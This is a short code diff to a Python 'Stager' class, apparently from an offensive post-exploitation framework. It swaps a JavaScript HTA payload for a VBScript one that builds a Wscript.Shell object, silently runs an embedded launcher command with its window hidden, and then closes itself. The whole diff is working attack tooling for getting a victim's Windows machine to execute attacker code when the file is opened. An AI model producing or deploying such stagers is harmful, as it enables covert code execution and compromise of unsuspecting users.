@@ -111,8 +111,18 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            code = "<html><head><script>var c= '"
-            code += launcher.replace("'", "\\'") + "'\n"
-            code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
+            code = "<script language=\"VBScript\">\n"
+            code += "Function var_func()\n"
+            code += "Dim var_shell\n"
+            code += "Set var_shell = CreateObject(\"Wscript.Shell\")\n"
+            code += "var_shell.run \""
+
+            code += launcher.replace("\"", "\\\"")
+            code += "\", 0, true\n"
             
+            code += "End Function\n"
+            code += "var_func\n"
+            code += "self.close\n"
+            code += "</script>"
+
         return code
